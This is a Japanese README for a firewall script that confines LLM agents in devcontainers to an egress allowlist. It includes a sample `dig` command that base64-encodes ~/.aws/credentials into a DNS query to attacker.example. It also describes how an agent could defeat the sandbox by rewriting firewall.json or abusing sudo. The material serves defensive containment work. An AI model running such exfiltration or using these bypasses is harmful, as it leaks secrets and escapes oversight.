# @himorogy/egress-guard

**LLM エージェントが動く devcontainer から、意図しない通信先へ出て行けなくする**ための egress 制御スクリプトです。

allowlist に載っていない宛先への外向き通信を遮断し、DNS をコンテナに割り当てられたリゾルバに固定します。プロンプトインジェクションやエージェントの暴走が起きても、秘密やソースコードを書き出せる先を限定することが目的です。

仕様の詳細は [`docs/spec.md`](./docs/spec.md) を参照してください。

---

# できること・できないこと

## できること

* **漏洩先の限定** — allowlist 外への外向き通信を DROP します
* **DNS 経路の固定** — 53 番宛は、コンテナに割り当てられたリゾルバ以外すべて DROP します（**任意のネームサーバーへ直接投げる経路は塞がりますが、DNS トンネリングそのものは防げません**。後述）
* **踏み台化の防止** — INPUT / OUTPUT / FORWARD すべて default DROP、IPv4 / IPv6 両方に適用します
* **プロジェクト単位の追加許可** — repo 内の `firewall.json` で許可先を足せます

## できないこと（設計上の非目標）

* **悪性コンテンツの流入防止はしません。** allowlist に GitHub や npm がある時点で任意のコンテンツは入ってきます
* **完全な exfil 防止は保証しません。** 許可済みドメインへの GET クエリ経由など、低帯域の漏洩経路は残ります。ここは egress 制御ではなく、クレデンシャル側（prod キーを置かない、fine-grained PAT を使う）で受け止める前提です
* **DNS トンネリングは防げません。** 53 番の宛先はリゾルバ 1 つに固定しますが、**そのリゾルバは再帰問い合わせをします。** `dig <秘密をエンコードした名前>.attacker.example` は正規のリゾルバ経由で攻撃者の権威ネームサーバーに届きます。詳細は [DNS リゾルバ](#dns-リゾルバ) を参照してください
* **L7 制御（HTTP メソッド別・パス別）はしません。** 将来 proxy に移行する際の担当範囲です

---

# 動作の概要

`postStartCommand` から root 権限で実行され、以下の順序でポリシーを適用します。

1. `firewall.json` を読み込み、スキーマを検証する（**検証失敗はここで exit≠0。panic テーブルが適用されます**）
2. **先にネットワークを閉じる**
   * IPv6 は最終状態（全 DROP）へ。以降、再オープンしません
   * IPv4 は bootstrap テーブル（loopback、割り当てられたリゾルバの 53 番、確立済みセッション、sshd のみ許可）へ
3. 閉じた状態のまま、DNS だけを使って allowlist を構築する（staging ipset に投入）
4. `ipset swap` で allowlist を差し替え、本番のフィルタテーブルを `iptables-restore` で一括適用する
5. GitHub meta API から CIDR を取得して追加する（best effort。失敗しても DNS 解決済みの GitHub ホストは許可済み）
6. 自己検証を実行する（失敗すれば exit≠0）

自己検証で使うプローブは、実際に対象外であることを確認してから選ばれます。外部 DNS のプローブは「設定済みリゾルバではないアドレス」、未許可先のプローブは「allowlist に載っていないホスト」です（`example.com` → `example.net` → `example.org` の順に試します）。そのため、これらを `allowDomains` に入れても自己検証は壊れません。

**リビルド中に外部ネットワークを必要とする工程はありません。** そのため、途中で強制終了されても「開いたまま固定される」状態にはなりません。

いずれかの工程で失敗した場合は panic テーブル（loopback と確立済み sshd 応答のみ許可、他は全 DROP）を適用したうえで exit≠0 します。`postStartCommand` の失敗としてユーザーに見える状態になります。

**`firewall.json` の検証エラーも panic に倒します。** 「設定ミスで既存のルールを乱すべきではない」という考え方もありますが、それが成り立つのは再適用時だけです。初回起動時の「直前のポリシー」は既定の全 ACCEPT なので、何も適用せずに終了するとコンテナは開いたまま残ります。タイプミスは `--check-config` で再ビルド前に見つけてください。

`iptables` が使えると確認する前（root 権限が無い、必須コマンドが無い）の失敗だけは、panic テーブルすら適用できないためルール未適用で終了します。

---

# 必要な環境

## Docker の実行権限

`NET_ADMIN` と `NET_RAW` が必要です。**書く場所は構成で変わります**（[capability の付け方](#capability-の付け方は構成で変わる)）。

```yaml
# Docker Compose を使う場合（推奨）: .devcontainer/docker-compose.yml
services:
  dev:
    cap_add:
      - NET_ADMIN
      - NET_RAW
```

```jsonc
// build + runArgs の場合: .devcontainer/devcontainer.json
"runArgs": [
  "--cap-add=NET_ADMIN",
  "--cap-add=NET_RAW"
]
```

## コンテナ内に必要なパッケージ

| パッケージ | 用途 |
|---|---|
| `iptables` | ルール適用（`iptables-restore` / `ip6tables-restore` を含む） |
| `ipset` | allowlist の保持 |
| `iproute2` | デフォルトゲートウェイの検出 |
| `dnsutils` | `dig` による名前解決 |
| `jq` | `firewall.json` のパースと検証 |
| `curl` | GitHub meta API の取得、自己検証 |
| `aggregate` | GitHub CIDR の集約（任意。無い場合は警告のみ） |

```dockerfile
RUN apt-get update && apt-get install -y --no-install-recommends \
  iptables ipset iproute2 dnsutils jq curl aggregate \
  && apt-get clean && rm -rf /var/lib/apt/lists/*
```

## DNS リゾルバ

コンテナに割り当てられたリゾルバ（`/etc/resolv.conf` の `nameserver` 行）を読み取り、**そのアドレス宛の 53 番だけを許可**します。それ以外の 53 番宛はすべて DROP し、遮断先を `egress-audit-v4` に記録します。

`nameserver` に IPv4 アドレスが 1 つも無い場合は、固定を緩めるのではなく **exit≠0 で停止します**。

### この固定で防げること・防げないこと

**防げる:** 攻撃者が用意したネームサーバーへ直接問い合わせる経路。`dig @attacker.example ...` は DROP され、`egress-audit-v4` に記録が残ります。

**防げない: DNS トンネリング。** 許可されたリゾルバは**再帰問い合わせ**をします。したがって次は通ります。

```sh
dig "$(base64 < ~/.aws/credentials | tr -d '\n' | cut -c1-60).exfil.attacker.example"
```

問い合わせは正規のリゾルバに向かい、リゾルバが上流へ転送し、攻撃者の権威ネームサーバーにラベルが届きます。TXT レスポンスで戻りチャネルも作れます。**これは埋め込みリゾルバ `127.0.0.11` でも同じです**（Docker デーモンが上流へ転送するため、コンテナの OUTPUT チェーンは上流パケットを見ません）。

リゾルバの選択では解決しません。塞ぐには L7 proxy か、応答するゾーンを制限する DNS 側のフィルタが要ります。**受容している残余リスク**として扱っています（[known-issues](./docs/known-issues.md) 項目 13）。

### ユーザー定義ネットワークを使う（推奨）

Docker の埋め込みリゾルバ `127.0.0.11` は、**ユーザー定義ネットワーク上でのみ**提供されます。`--network` を指定せずに起動したコンテナはデフォルトブリッジに入り、`/etc/resolv.conf` にはホスト側の DNS アドレスが直接書かれます。

```sh
$ cat /etc/resolv.conf
nameserver 192.168.65.7          # デフォルトブリッジの場合（Docker Desktop）
nameserver 127.0.0.11            # ユーザー定義ネットワークの場合
```

どちらでも動作しますが、**埋め込みリゾルバのほうが強い**設定です。

| | 許可される宛先 | パケットの行き先 |
|---|---|---|
| 埋め込みリゾルバ | `127.0.0.11:53` | **コンテナ自身の netns 内。eth0 から出ない** |
| ホストのリゾルバ | 例 `192.168.65.7:53` | **eth0 から実際に出る**。実在のネットワーク上のサービスに届く |

#### ホストのリゾルバを許可するとは何が起きることか

**「実在のネットワーク機器に、ポート 53 で到達できる経路が 1 本開く」**ということです。

情報の取得（内部名の列挙など）は、**埋め込みリゾルバでも同じように可能**です。どちらのリゾルバも上流へ転送するため、`dig jenkins.corp.local` は両方で解決します。**リゾルバの選択で変わるのは、到達性（実在の機器にパケットが届くか）だけです。**

その到達性がどれだけ問題になるかは、ホストの OS で大きく変わります。

**Docker Desktop（macOS / Windows）の場合 — 影響は小さい**

コンテナは Linux VM の中で動いており、`192.168.65.0/24` は **VM の内部ネットワーク**です。

* `192.168.65.7` — Docker Desktop の DNS フォワーダ（VM 内のサービス）
* `192.168.65.254` — `host.docker.internal`（ホスト OS 自身）

許可されるのは `.7` の 53 番だけで、**この相手は VM 内で DNS 転送しかしていないコンポーネント**です。物理 LAN 上の機器ではありません。したがって「LAN に穴が開く」状態にはなりません。

**Linux ホストの場合 — 影響は大きい**

VM が挟まりません。デフォルトブリッジでは、Docker が**ホストの `/etc/resolv.conf` の nameserver をそのままコンテナに書き込みます**。したがって許可先は次のような**実在の機器**になります。

* `192.168.1.1` — 家庭用ルータ
* `10.0.0.53` — 社内 DNS サーバー
* VPN 接続中なら、その先の DNS サーバー

**サンドボックスから、その機器の 53 番に到達できる状態になります。** ポートは 53 に限られますが、

* その DNS 実装の脆弱性、動的更新、キャッシュポイズニングは射程に入ります
* コンテナは「LAN 上の機器と通信できないはず」の前提が崩れます

`allowCidrs` は RFC1918 を拒否しますが、**`resolv.conf` 由来のリゾルバアドレスはこの検証を通りません**（通したら名前解決が成立しないため）。つまり **RFC1918 の実機に、意図的に穴を 1 つ開けています。** 埋め込みリゾルバならこの穴自体が不要になります。

加えて Linux ホストでは動作上の利点もあります。ホストが `systemd-resolved`（`127.0.0.53`）を使っている場合、デフォルトブリッジでは Docker がループバックを除外して **`8.8.8.8` / `8.8.4.4` にフォールバック**します。埋め込みリゾルバならデーモン経由でホスト本来のリゾルバが使われ、社内名の解決も期待どおりに動きます。

#### 埋め込みリゾルバのデメリット

「無い」わけではありません。

* **ユーザー定義ネットワークが前提になる** — 作成の手間、アドレスプールの枯渇（Docker 既定では 30 個前後）、不要になったネットワークの掃除（`docker network prune`）
* **nat テーブルに Docker の DNS DNAT ルールが増える** — 本スクリプトは nat を触らないため共存しますが、この構成での確認は[検証待ち](./docs/known-issues.md)です
* **同一ネットワーク上のコンテナ名が引ける** — 埋め込み DNS の本来機能。ネットワークをプロジェクトごとに分ければ影響は自分のスタック内に閉じます
* **Docker デーモンへの依存が 1 段増える** — デーモンの DNS 機能が壊れると名前解決が止まります
* **DNS の観測性はむしろ下がる** — ホストのリゾルバ宛なら、ホスト側で `tcpdump` してどのコンテナが何を問い合わせたか追えます。埋め込みリゾルバではデーモンが集約するため、コンテナ単位の帰属が取りにくくなります

### ネットワークはプロジェクトごとに分ける

**1 つのネットワークを全プロジェクトで共有しないでください。** 同じユーザー定義ネットワーク上のコンテナは相互に到達でき、埋め込み DNS が**コンテナ名で名前解決できてしまいます**。

egress-guard は大部分を守ります（相手の IP はブリッジのサブネット = RFC1918 で allowlist に載らないため REJECT）。ただし守れない面が残ります。

* **`sshdPort`（既定 22）は INPUT で `NEW` を許可しています。** 同居する全コンテナから叩ける口になります
* **firewall 適用前の窓** — `postStartCommand` 完了までは無防備です
* **egress-guard を入れていないコンテナ**が同居していれば、そちらは無制限です

分ければこれらは最初から発生しません。コストはほぼゼロです。

### 推奨構成

> **どちらもこのパッケージの必須要件ではありません。** スクリプトは割り当てられたリゾルバを読んで動作し、埋め込みリゾルバでなければ警告を出すだけです。ネットワーク構成は利用側の Docker / devcontainer の領分であり、ここでは推奨を示すに留めます。

#### 案 A: Docker Compose を使う

**Compose はプロジェクトごとのユーザー定義ネットワーク（`<project>_default`）を自動で作ります。** そのため次がまとめて解決します。

* `initializeCommand` が不要
* `--network` の指定が不要
* プロジェクトごとの分離が自動
* `docker compose down` でネットワークも消えるため、アドレスプールが枯渇しにくく `prune` も不要

```yaml
# .devcontainer/docker-compose.yml
services:
  dev:
    build:
      context: .
      dockerfile: Dockerfile
    cap_add:
      - NET_ADMIN
      - NET_RAW
    volumes:
      - ../..:/workspace:cached
    command: sleep infinity
```

```jsonc
// .devcontainer/devcontainer.json
{
  "name": "my project",
  "dockerComposeFile": "docker-compose.yml",
  "service": "dev",
  "workspaceFolder": "/workspace/my-project",
  "remoteUser": "node",
  "postStartCommand": "sudo /usr/local/bin/init-project-firewall.sh",
  "waitFor": "postStartCommand"
}
```

**注意:** `dockerComposeFile` を使うと `runArgs` は無視されます。`--cap-add` は `cap_add`、`mounts` は `volumes` に書き換えてください。

#### 案 B: `initializeCommand` でネットワークを用意する

Compose に移行しない場合はこちらです。ネットワーク名にプロジェクト名を含めることで、**設定文字列を全プロジェクトで同一にしたまま**分離できます。

```jsonc
// .devcontainer/devcontainer.json
"initializeCommand": "docker network inspect egress-guard-${localWorkspaceFolderBasename} >/dev/null 2>&1 || docker network create egress-guard-${localWorkspaceFolderBasename} 2>/dev/null || true",
"runArgs": [
  "--cap-add=NET_ADMIN",
  "--cap-add=NET_RAW",
  "--network=egress-guard-${localWorkspaceFolderBasename}"
]
```

> 使い終わったネットワークは `initializeCommand` では消えません。案 B を採る場合は定期的に `docker network prune` してください。

#### デフォルトブリッジのまま運用する場合

非推奨ですが動作します。起動時に次の警告が出ます。

```
[firewall] WARNING: DNS pinned to 192.168.65.7 (not the Docker embedded resolver).
[firewall] WARNING: This container is not on a user defined Docker network. See the README for the stronger setup.
```

---

# セットアップ

## Dockerfile に追記するもの

**必要なのは 4 つです。** すべて root で、イメージビルド時に行います。

| 追記するもの | 目的 |
|---|---|
| パッケージのインストール | `iptables` / `ipset` などの実行環境 |
| スクリプトを `/usr/local/bin/` へコピー | `node` が書き換えられない場所に置く |
| `firewall.json` を `/etc/egress-guard/` へコピー | `node` が書き換えられない場所に置く |
| sudoers 行 | `node` が引数なしで実行できるようにする |

```dockerfile
USER root

# 1. 必要なパッケージ（aggregate は任意）
RUN apt-get update && apt-get install -y --no-install-recommends \
      iptables ipset iproute2 dnsutils jq curl aggregate \
  && apt-get clean && rm -rf /var/lib/apt/lists/*

# 2. スクリプトを /usr/local/bin へコピー（パッケージから取得する場合）
RUN npm install -g @himorogy/egress-guard \
  && cp "$(npm root -g)/@himorogy/egress-guard/scripts/init-project-firewall.sh" \
        /usr/local/bin/init-project-firewall.sh \
  && chown root:root /usr/local/bin/init-project-firewall.sh \
  && chmod 755 /usr/local/bin/init-project-firewall.sh

# 3. firewall.json を /etc/egress-guard へコピー（ビルドコンテキストに応じてパスを調整）
COPY firewall.json /etc/egress-guard/firewall.json
RUN chown -R root:root /etc/egress-guard \
  && chmod 755 /etc/egress-guard \
  && chmod 644 /etc/egress-guard/firewall.json

# 4. sudoers。末尾の "" は必須（後述）
RUN printf 'node ALL=(root) NOPASSWD: /usr/local/bin/init-project-firewall.sh ""\n' \
      > /etc/sudoers.d/node-firewall \
  && chmod 0440 /etc/sudoers.d/node-firewall

USER node
```

**`postCreateCommand` では配置できません。** 既定で `remoteUser`（＝ `node`）として実行されるためです。

## devcontainer.json に追記するもの

構成によらず必要なのは起動フックだけです。

```jsonc
"postStartCommand": "sudo /usr/local/bin/init-project-firewall.sh",
"waitFor": "postStartCommand"
```

`waitFor` を `postStartCommand` にしておくと、ファイアウォールの適用に失敗した状態でエディタが使えるようになる前に、失敗が表面化します。

### capability の付け方は構成で変わる

`NET_ADMIN` と `NET_RAW` が要ります。**書く場所が構成で違います。**

| 構成 | 書く場所 |
|---|---|
| Docker Compose（[案 A](#案-a-docker-compose-を使う)。推奨） | `docker-compose.yml` の `cap_add` |
| `build` + `runArgs`（[案 B](#案-b-initializecommand-でネットワークを用意する)） | `devcontainer.json` の `runArgs` |

**`dockerComposeFile` を使うと `runArgs` は無視されます。** Compose 構成では `devcontainer.json` に `runArgs` を書いても効きません。

```yaml
# 案 A: .devcontainer/docker-compose.yml
services:
  dev:
    cap_add:
      - NET_ADMIN
      - NET_RAW
```

```jsonc
// 案 B: .devcontainer/devcontainer.json
"runArgs": [
  "--cap-add=NET_ADMIN",
  "--cap-add=NET_RAW"
]
```

ネットワーク構成の推奨は [ネットワークはプロジェクトごとに分ける](#ネットワークはプロジェクトごとに分ける) を参照してください。

## 配置はスクリプトが検証します

**手動での確認手順はありません。** 配置を間違えたまま静かに弱い構成で動く、という状態を避けるため、スクリプト自身が起動時に検証して失敗します。

| 検証されること | 失敗したときのメッセージ |
|---|---|
| スクリプト自身が root 所有・非書き込み可（sudo 経由の実行時のみ） | `must be owned by root ... privilege escalation path` |
| `/etc/egress-guard/firewall.json` が root 所有・非書き込み可・symlink でない | `must be owned by root` / `must not be a symlink` |
| 親ディレクトリ `/etc/egress-guard` が root 所有・非書き込み可 | `must be owned by root ... a writable directory lets the file be replaced` |

sudoers の書き間違い（末尾 `""` の欠落）は、スクリプト側が `SUDO_USER` 付きの引数実行を拒否することで無効化されます。

> **検証の限界。** 悪意をもって差し替えられたスクリプトに対しては、これらの検証は意味を持ちません（差し替えた側が検証コードごと消せます）。捕まえられるのは**設定ミス**であり、それがこの手順で現実に起きる失敗です。詳細は [`docs/known-issues.md`](./docs/known-issues.md) の項目 14。

---

## 補足: なぜこの置き方なのか

**読まなくてもセットアップはできます。** 上の手順から逸脱するときに読んでください。

### スクリプトを `node_modules` から実行してはいけない

sudoers が指すパスが `node_modules` の中にあると、**エージェントがスクリプト本体を書き換えて root で実行できます。** `node_modules` は非特権ユーザーが書き込める場所です。必ず `/usr/local/bin/` へコピーし、`root:root` 所有にしてください。

成立している防御は次の 2 点です。

* ファイルが `root:root` 所有・`755`・`/usr/local/bin` 配下にあり、`node` に書き込み権限がない
* `node` に許可された sudo が当該スクリプトの引数なし実行のみで、`chattr` も `cp` も実行できない

> **`chattr +i` は使いません。** `CAP_LINUX_IMMUTABLE` は Docker のデフォルト capability セットに含まれず、`docker build` の `RUN` であっても失敗します。加えて `chattr +i` が守るのは「root を取った攻撃者による書き換え」ですが、root を取られた時点で `chattr -i` も打てるため防御価値は限定的です。詳細は [`docs/known-issues.md`](./docs/known-issues.md) の項目 5。

### sudoers の末尾 `""` が必須な理由

sudoers の仕様では、**Cmnd に引数を書かないと「任意の引数で実行してよい」という意味になります。** 引数なしのみを許可するには、空の引数リスト `""` を明示する必要があります。

```
# NG: 任意の引数を許してしまう
node ALL=(root) NOPASSWD: /usr/local/bin/init-project-firewall.sh

# OK: 引数なしのみ許可
node ALL=(root) NOPASSWD: /usr/local/bin/init-project-firewall.sh ""
```

スクリプト側でも `SUDO_USER` / `SUDO_UID` が設定された状態で引数が渡された場合は拒否します（多重防御）。sudoers を正しく書いていれば、そもそもここには到達しません。

### repo の `firewall.json` を直接読ませない理由

このファイアウォールが想定している敵は**コンテナ内で動くエージェント自身**です。そしてエージェントは sudoers により、いつでも再適用を実行できます。

再適用が読むファイルをエージェントが書き換えられるなら、次の 2 手でポリシー全体が無効になります。

1. `firewall.json` に `{"mode": "audit"}` あるいは `{"allowDomains": ["attacker.example"]}` と書く（**構文的に正当なのでバリデーションは通ります**）
2. `sudo /usr/local/bin/init-project-firewall.sh` を実行する

root は取られていませんが、目的は達成されています。したがって効力を持つ設定は root 所有でなければなりません。

この分離により、次の 2 つが別の操作になります。

| 操作 | 誰が | 必要なもの |
|---|---|---|
| 再解決（CDN の IP 変動への追随） | エージェントでも可 | 再適用のみ |
| ポリシー変更 | 人間 | repo の編集 + イメージ再ビルド |

スクリプトは `/etc/egress-guard/firewall.json` とその親ディレクトリが root 所有かつグループ・その他から書き込み不可であること、および symlink でないことを実行時に確認します。ワークスペース上のファイルを bind mount で被せた場合はここで停止します。

`audit` モードで試行錯誤する間も再ビルドが必要になりますが、audit の収集フェーズは人間が回すものなので許容範囲と判断しています。

---

# firewall.json

プロジェクト固有の追加許可を書きます。

**読まれるのは `/etc/egress-guard/firewall.json` だけです。** 見つからない場合は基底プロファイルのみで動作します。理由は[repo の `firewall.json` を直接読ませない理由](#repo-の-firewalljson-を直接読ませない理由) を参照してください。

repo 側の `.devcontainer/firewall.json` はそのソースであり、**イメージを再ビルドしたときに反映されます。** 再ビルド前に内容を検証したい場合は、パスを明示して `--check-config` にかけてください。

```sh
# 再ビルド前に repo 側のコピーを検証する
init-project-firewall.sh --check-config --config .devcontainer/firewall.json

# 現在インストールされている設定を検証する
init-project-firewall.sh --check-config
```

## テンプレート

`templates/` に雛形があります。プロジェクトの `.devcontainer/` にコピーして使ってください。

| ファイル | 用途 |
|---|---|
| `templates/firewall.json` | 通常の初期設定（`enforce`、追加許可なし） |
| `templates/firewall.audit.json` | 新規プロジェクトの立ち上げ用（`audit`） |
| `templates/firewall.example.json` | 全フィールドを埋めた記入例 |

```sh
cp node_modules/@himorogy/egress-guard/templates/firewall.json .devcontainer/firewall.json
```

**JSON にコメントは書けません。** `jq` でパースするため、コメント付きの JSON5 / JSONC 形式は「不正な JSON」として拒否されます。

## スキーマ

```json
{
  "version": 1,
  "profile": "default",
  "mode": "enforce",
  "allowDomains": ["registry.example.com"],
  "allowCidrs": ["203.0.113.0/24"],
  "allowHostPorts": [5432],
  "sshdPort": 22
}
```

| フィールド | 型 | 必須 | 説明 |
|---|---|---|---|
| `version` | int | ✔ | スキーマ版。現在は `1` のみ。未知の版は拒否します |
| `profile` | string | — | 基底プロファイル名。現在は `default` のみ |
| `mode` | `"enforce"` \| `"audit"` | — | 既定は `enforce`。詳細は後述 |
| `allowDomains` | string[] | — | 追加許可ドメイン。**ワイルドカードは使えません**（[理由](#ワイルドカードドメインは使えません)）。具体的なホスト名を書いてください |
| `allowCidrs` | string[] | — | 追加許可 CIDR |
| `allowHostPorts` | int[] | — | ホスト宛に許可する TCP ポート（デフォルトゲートウェイと `host.docker.internal`） |
| `sshdPort` | int | — | コンテナ内 sshd のポート。既定は `22` |

未知のフィールドが含まれている場合は拒否します（タイプミスが黙って無視されるのを防ぐため）。

## 拒否される値

効力を持つ `firewall.json` は root 所有ですが、その内容は repo から来る以上、**攻撃者が書いたデータとして扱います。** 以下は root 側のスクリプトが検証段階で拒否します。

* **`*` を含むドメイン**（`*.example.com`、`*`、`*.com` など。[理由](#ワイルドカードドメインは使えません)）
* ドメイン名として不正な文字列（シェルのメタ文字、空白、改行など）
* `0.0.0.0/0`、`::/0`、プレフィックス長 8 未満の CIDR
* プライベートアドレス帯を含む CIDR
  * RFC1918（`10/8`、`172.16/12`、`192.168/16`）
  * **`100.64.0.0/10`（CGNAT）** — ホストに Tailscale 網が繋がっている場合の横移動対策
  * loopback、link-local、multicast / reserved
  * 前方一致ではなく数値レンジの重複判定を行うため、`100.0.0.0/8` のような包含するスーパーネットも拒否します
* 範囲外のポート番号

`firewall.json` は **PR レビュー必須ファイル**として扱ってください。

## ホストゲートウェイの扱い

ホスト網は**既定で不許可**です。ホストには Tailscale 網などが繋がっている可能性があり、包括的に許可すると横移動の経路になるためです。

必要なポート（ローカル DB など）だけを `allowHostPorts` で開けてください。許可されるのは**ホストを指すアドレス宛の指定 TCP ポートのみ**で、ホストのサブネット全体ではありません。

許可対象になるアドレスは次の 2 つです。

* デフォルトゲートウェイの IP（`ip route show default`）
* `host.docker.internal` の解決結果

**Docker Desktop ではこの 2 つが別のアドレスになることがあります。** ゲートウェイだけを許可すると、ホスト上のローカル DB に届きません。両方を開けるのはそのためです。

どちらも取得できない状態で `allowHostPorts` が指定されている場合は、要求された許可を黙って落とすのではなく exit≠0 で停止します。

---

# モードと運用

## enforce（既定）

allowlist 外の外向き通信を REJECT します。遮断された宛先は ipset `egress-audit-v4` に記録されるため、何が弾かれたかを後から確認できます。

## audit

新規プロジェクトの立ち上げ用です。allowlist 外の通信を**遮断せず**、`fw-audit:` プレフィックスでログだけ残します。

```json
{ "version": 1, "mode": "audit" }
```

数日運用して `egress-audit-v4` から必要な宛先を収集し、`firewall.json` に転記してから `enforce` に切り替える、という流れを想定しています。静的 allowlist の「事前に全部知らないと使えない」問題への緩和策です。

**audit でも遮断されるもの:**

* **DNS 固定** — 割り当てられたリゾルバ以外への 53 番宛は audit でも DROP します。正規のトラフィックはそのリゾルバ経由なので実害はなく、ここを緩めるとポリシー全体が無意味になります
* **IPv6** — audit でも全 DROP のままです。試行はログ（`fw-drop6:`）に残ります
* **INPUT** — audit でも DROP のままです。audit が緩めるのは IPv4 の外向き通信だけです

## 遮断された宛先を調べる

### ipset `egress-audit-v4`（推奨）

allowlist を通らなかった宛先 IP が自動で溜まります。**enforce / audit の両モードで記録されます。**

```sh
# コンテナ内・root（ホストから: docker exec -u root <container> ipset list egress-audit-v4）
ipset list egress-audit-v4
```

```
Name: egress-audit-v4
Type: hash:ip
Members:
93.184.216.34 timeout 603412
104.16.132.229 timeout 604233
```

**割り当てられたリゾルバ以外への 53 番宛（＝ DNS トンネリングの試行）もここに記録されます。** DNS の DROP は allowlist より前段にあるため、専用の記録ルールを置いています。

記録されるのは IP だけなので、ホスト名は自分で引く必要があります。

```sh
dig +short -x 93.184.216.34
```

**逆引きは当てになりません。** CDN や link-local アドレスは PTR を持たないか、持っていても汎用的な名前しか返しません。空振りする場合は TLS 証明書から引いてください（`audit` モード中、その宛先に到達できる状態で）。

```sh
echo | openssl s_client -connect 93.184.216.34:443 2>/dev/null \
  | openssl x509 -noout -subject -ext subjectAltName
```

必要なものを `firewall.json` の `allowDomains` に転記して再適用してください。

> `169.254.169.254`（クラウドのメタデータサービス）のような link-local アドレスが記録されることがあります。これらは `FORBIDDEN_CIDRS` に含まれるため `firewall.json` では許可できません。遮断されているのが正しい状態です。

エントリは 7 日で自動的に消えます。set はスクリプトを再実行しても**作り直されません**（蓄積が目的のため）。手動で空にしたい場合:

```sh
ipset flush egress-audit-v4
```

> `SET` ターゲットが使えないカーネルでは、この記録ルールを外した構成に自動でフォールバックします。その場合は起動ログに `retrying without the blocked-destination recorder` が出ます。

### カーネルログ（環境依存・当てにしない）

`fw-drop:` / `fw-audit:` / `fw-dns-drop:` / `fw-drop6:` の `LOG` ルールも入っていますが、**多くの環境では出力されません。**

* コンテナ内の `dmesg` は `CAP_SYSLOG` が無いため読めない
* `net.netfilter.nf_log_all_netns` が既定の `0` の場合、カーネルが非初期ネットワーク名前空間からのログを抑制する

つまりホストから読んでも出てきません。詳細と有効化方法は [`docs/known-issues.md`](./docs/known-issues.md) の項目 4 を参照してください。**運用の前提にしないでください。**

## 再適用

allowlist は起動時の名前解決に基づくため、CDN の IP 変動で許可先に到達できなくなることがあります。

```sh
sudo /usr/local/bin/init-project-firewall.sh
```

再実行すれば回復します。何度実行しても同じ結果になります（冪等）。

sudoers の設定上、**エージェント自身も再適用できます。** これは意図した設計です。再適用が行うのは `/etc/egress-guard/firewall.json`（root 所有）の再解決だけで、ポリシーそのものは変えられません。「再解決は自由、ポリシー変更は再ビルド」という分離になっています。

---

# トラブルシューティング

## 起動時にファイアウォールの適用が失敗する

panic テーブルが適用され、loopback 以外の通信はできない状態になっています。エラーメッセージを確認してください。

| メッセージ | 原因 |
|---|---|
| `... does not match the schema` / `rejected ... entry` | `firewall.json` の内容が不正。後述の `--check-config` で確認できます。**この場合も panic テーブルが適用されます** |
| `must be owned by root` / `must not be a symlink` / `must not be group or world writable` | `/etc/egress-guard/firewall.json` かその親ディレクトリの所有者・権限が不正。ワークスペースのファイルを bind mount していないか確認してください |
| `no nameserver found in /etc/resolv.conf` | リゾルバが検出できない。DNS を開放するのではなく停止します |
| `declares only non-IPv4 nameservers` | IPv6 のリゾルバしかない。IPv6 は設計上すべて DROP するため名前解決が成立しません |
| `IPv6 is active but ip6tables is unusable` | IPv6 スタックが生きているのに `ip6tables` が使えない状態。IPv6 が素通りするため、あえて停止しています。`iptables` パッケージの導入を確認してください |
| `none of the required base domains resolved` | 名前解決自体が機能していない。Docker のネットワーク設定を確認してください |
| `verify FAILED: ...` | ルールは適用されたが、環境が想定と異なる。個別のメッセージを確認してください |

## 特定の通信だけが通らない

`ipset list egress-audit-v4` で遮断された宛先を確認し、逆引きしてから `firewall.json` の `allowDomains` / `allowCidrs` に追加して再適用してください。

新規プロジェクトで許可先が読めない場合は、いったん `mode: "audit"` で運用してログを集めるのが早道です。

---

# 開発

## テスト

```sh
pnpm test          # 設定バリデーション + ルール適用の両方
```

* `tests/firewall-config.test.sh` — `firewall.json` のスキーマ検証と各バリデータ
* `tests/firewall-rules.test.sh` — `iptables` / `ipset` / `dig` / `curl` などを記録型スタブに差し替え、生成されるフィルタテーブルとコマンド順序を検証します（root 不要）

```sh
pnpm lint:sh       # shellcheck（要 shellcheck、または npx shellcheck）
```

## 開発用オプション

```sh
# インストール済みの設定を検証して終了（ルールには一切触れない）
init-project-firewall.sh --check-config

# 固定のパスではなく指定したファイルを読む（再ビルド前の検証）
init-project-firewall.sh --check-config --config .devcontainer/firewall.json

# resolv.conf を差し替える（テスト用）
init-project-firewall.sh --check-config --resolv-conf ./resolv.conf
```

いずれも開発・テスト専用です。**`sudo` 経由で引数が渡された場合は拒否されます。** 適用される設定は常に `/etc/egress-guard/firewall.json` で、`--config` からは動かせません。

---

# 既知の課題・制限

一覧は [`docs/known-issues.md`](./docs/known-issues.md) を参照してください。運用上つまずきやすいものを以下に挙げます。

## ワイルドカードドメインは使えません

`allowDomains` に `*.example.com` のようなワイルドカードは**書けません。** バリデーションで拒否され、起動が失敗します。

```
[firewall] ERROR: rejected allowDomains entry: *.example.com - wildcards are not supported.
DNS cannot enumerate the subdomains of a zone, so a wildcard cannot be expanded into addresses.
List the host names you need instead; run in audit mode and read ipset egress-audit-v4 to find
out which ones those are.
```

### 理由

このファイアウォールは、ドメイン名を**起動時に IP へ解決して ipset に載せる**方式です。パケットを見る時点ではドメイン名は存在せず、宛先 IP しかありません。

そして **DNS には「あるゾーンのサブドメインを列挙する」手段がありません。** `*.example.com` を IP の集合に展開することは原理的にできません。

そのため、ワイルドカードを受理しても実現できるのは apex（`example.com`）の解決だけで、`api.example.com` も `db.example.com` も遮断されたままになります。**セキュリティ設定において「受理するが実現しない」のは最悪の性質です。** 設定を書いた人は「サブドメイン全体が通っている」と信じ、実際には通っていません。警告ではこの誤認を防げないため、拒否します。

**回避策: 必要なホスト名を具体的に列挙してください。**

```json
{
	"version": 1,
	"allowDomains": [
		"ep-cool-name-123456.ap-southeast-1.aws.neon.tech",
		"api.example.com"
	]
}
```

どのホスト名が必要かわからない場合は `mode: "audit"` で運用し、`egress-audit-v4` に溜まった IP から逆引き（あるいは TLS 証明書の SAN）で特定してください。

ワイルドカード対応は L7 proxy（SNI ベースのフィルタリング）への移行時に扱う課題です。proxy であればパケットにドメイン名が乗るため、展開せずにマッチできます。スキーマ version 2 での導入を想定しています。

## 許可済みドメインへの GET 経由の漏洩は防げません

L3/L4 では HTTP メソッドもパスも見えないため、`allowDomains` に入れたドメインへ「クエリ文字列に秘密を載せた GET」を投げる経路は残ります。これは設計上の非目標であり、クレデンシャル側で受け止める前提です。

## Web 検索・Web 取得は使えます

egress 規制下でも Claude Code の WebSearch / WebFetch は動作します。allowlist を広げる必要はありません。詳細と注意点は [`docs/web-search-fetch.md`](./docs/web-search-fetch.md) を参照してください。

## DNS トンネリングは防げません

